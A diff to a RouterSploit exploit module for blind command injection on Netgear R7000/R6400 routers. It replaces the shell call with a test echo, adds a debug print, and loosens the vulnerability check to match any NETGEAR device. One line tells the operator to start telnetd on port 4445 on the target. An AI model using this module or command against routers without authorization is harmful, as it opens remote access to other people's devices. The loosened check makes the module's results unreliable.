--- routersploit/modules/exploits/routers/netgear/r7000_r6400_rce.py
+++ routersploit/modules/exploits/routers/netgear/r7000_r6400_rce.py
@@ -35,7 +35,8 @@ class Exploit(HTTPClient):
             print_success("Target is probably vulnerable")
             print_status("Invoking command loop...")
             print_status("It is blind command injection. Try to start telnet with telnet telnetd -p '4445'")
-            shell(self, architecture="armle")
+            self.execute("echo b33f38")
+            #shell(self, architecture="armle")
         else:
             print_error("Target is not vulnerable")
 
@@ -56,11 +57,13 @@ class Exploit(HTTPClient):
             path="/",
         )
 
+        print(response)
+
         if response is None:
             return False  # target is not vulnerable
 
         if "WWW-Authenticate" in response.headers.keys():
-            if any(map(lambda x: x in response.headers['WWW-Authenticate'], ["NETGEAR R7000", "NETGEAR R6400"])):
+            if "NETGEAR" in response.headers['WWW-Authenticate'].upper():
                 return True  # target is vulnerable
 
         return False  # target is not vulnerable
